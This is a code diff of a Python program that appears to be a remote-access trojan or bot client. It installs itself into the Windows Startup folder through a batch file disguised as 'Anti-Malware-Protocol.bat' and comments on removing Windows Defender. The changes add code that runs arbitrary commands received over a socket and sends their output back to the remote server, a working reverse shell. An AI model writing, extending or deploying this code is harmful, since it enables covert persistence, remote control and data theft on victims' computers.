@@ -1,5 +1,6 @@
 import socket, random, time, threading, os, sys
 from shutil import copyfile
+opsys = sys.platform
 #should delete windows defender
 '''
 windefdelname = 'Anti-Virus-Upgrader.bat'
@@ -24,16 +25,19 @@ def get_filename():
     final_result = result[(len(result) -  1)]
     return final_result
 user = os.getlogin()
-try:
-    copyfile(f'{get_filename()}',f'C:/Users/{user}/{get_filename()}')
-    os.chdir(f'C:/Users/{user}/{get_filename()}')
-except:
+if opsys == "win32":
+    try:
+        copyfile(f'{get_filename()}', f'C:/Users/{user}/{get_filename()}')
+        os.chdir(f'C:/Users/{user}/{get_filename()}')
+    except:
+        pass
+    os.chdir(f'C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')
+    file = open('Anti-Malware-Protocol.bat', 'w')
+    linestowrite = ['\n', f'cd C:/Users/{user}/\n', f'start {get_filename()}\n']
+    file.writelines(linestowrite)
+    file.close()
+else:
     pass
-os.chdir(f'C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')
-file = open('Anti-Malware-Protocol.bat', 'w')
-linestowrite = ['\n',f'cd C:/Users/{user}/\n', f'start {get_filename()}\n']
-file.writelines(linestowrite)
-file.close()
 port = 80
 ip = ''
 time.sleep(1)
@@ -139,8 +143,18 @@ while True:
             s.send(login)
         elif message.lower().startswith('!checkping'):
             pass
+        elif message.lower().startswith('!listips'):
+            pass
         else:
-            os.system(message)
+            try:
+                msgtoserv = os.popen(message).readlines()
+                result = ""
+                for i in msgtoserv:
+                    result = result + i
+                s.send(result.encode())
+            except:
+                pass
+            
     except:
         while True:
             try:
